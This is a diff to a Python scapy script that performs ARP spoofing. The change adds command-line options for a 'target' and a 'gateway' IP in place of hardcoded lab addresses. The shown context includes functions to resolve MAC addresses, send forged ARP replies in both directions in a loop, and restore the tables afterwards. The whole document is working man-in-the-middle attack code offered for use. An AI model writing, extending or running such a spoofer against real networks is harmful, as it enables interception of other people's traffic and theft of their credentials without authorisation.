@@ -2,7 +2,20 @@
 
 # from scapy import *
 import scapy.all as scapy
-import time, sys
+import time, sys, optparse
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_ip", help="Target IP for attack")
+    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway of network")
+    (options, arguments) =  parser.parse_args()
+    if not options.target_ip:
+        parser.error("[-] Please specify a target IP, use --help for more information.")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify the gateway IP of your target host, use --help for more information.")
+    return options
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -31,11 +44,16 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose=False)
 
 
-target_ip = "10.0.2.129"
-gateway_ip = "10.0.2.1"
+# target_ip = "10.0.2.129"
+# gateway_ip = "10.0.2.1"
 
 packets_sent_count = 0
 try:
+    options = get_arguments()
+    target_ip = options.target_ip
+    print(target_ip)
+    gateway_ip = options.gateway_ip
+    print(gateway_ip)
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
